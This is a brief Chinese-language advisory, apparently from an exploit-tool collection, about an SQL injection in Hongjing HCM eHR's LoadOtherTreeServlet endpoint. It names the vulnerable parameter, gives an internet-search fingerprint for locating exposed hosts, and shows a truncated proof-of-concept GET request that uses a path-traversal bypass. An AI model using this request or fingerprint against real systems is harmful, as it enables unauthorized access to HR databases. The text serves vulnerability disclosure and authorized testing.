---
source: "R4gd0ll/I-Wanna-Get-All"
---

# 宏景HCM LoadOtherTreeServlet SQL注入漏洞

## 漏洞描述

宏景HCM `/w_selfservice/oauthservlet/%2e./.%2e/gz/LoadOtherTreeServlet` 接口 `budget_id` 等参数存在 SQL 注入漏洞。

## 影响版本

```
宏景HCM eHR
```

## 网络测绘

```
app="HJSOFT-HCM"
```

## 漏洞复现

```
GET /w_selfservice/oauthservlet/%2e./.%2e/gz/LoadOtherTreeServlet?modelflag=4&flag=1&budget_id=1'... HTTP/1.1
```

> 仅限授权测试。PoC 逻辑提取自 I-Wanna-Get-All 集成利用工具对应模块。
